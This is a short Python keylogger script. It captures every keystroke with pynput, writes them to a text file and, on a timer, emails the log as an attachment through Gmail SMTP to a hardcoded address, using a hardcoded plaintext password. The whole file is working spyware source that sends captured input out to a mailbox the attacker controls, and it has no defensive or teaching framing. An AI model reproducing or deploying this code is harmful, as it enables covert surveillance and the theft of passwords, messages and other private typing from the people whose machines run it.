from pynput.keyboard import Key, Listener
from re import sub
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


filename = "the_keylogger_i_made_log.txt"
path = ""
extension = "\\"
fromaddr = "somethingawesomekeylogger58@gmail.com"
toaddr = "somethingawesomekeylogger58@gmail.com"
password = "pythonkeylogger"

time_iter = 15
num_iter = 0
curr_time = time.time()
stop_time = time.time() + time_iter
num_iter_end = 2

replacement_map = {
    "Key.backspace": "[<-]",
    "Key.space": " ",
    "Key.left": "[<]",
    "Key.right": "[>]",
    "Key.up": "[^]",
    "Key.down": "[v]",
    "Key.enter": "[enter]\n"
}


def send_email(filename, attachment):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "log file dump"
    body = "Body of the email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet_stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


while num_iter < num_iter_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, curr_time
        keys.append(key)
        count += 1
        curr_time = time.time()

        # reset
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        fullpath = path + filename
        with open(fullpath, "a") as f:
            for key in keys:
                print(f"key = {key}")
                # get rid of annoying single quotes
                k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))

                if k in replacement_map:
                    f.write(replacement_map[k])

                # in case of other special characters, get rid of "key." bit
                else:
                    f.write(sub(r"Key\.(.*)", r"[\1]", k))

                f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if curr_time > stop_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if curr_time > stop_time:
        send_email(filename, path + filename)

    num_iter += 1
    curr_time = time.time()
    stop_time = time.time() + time_iter
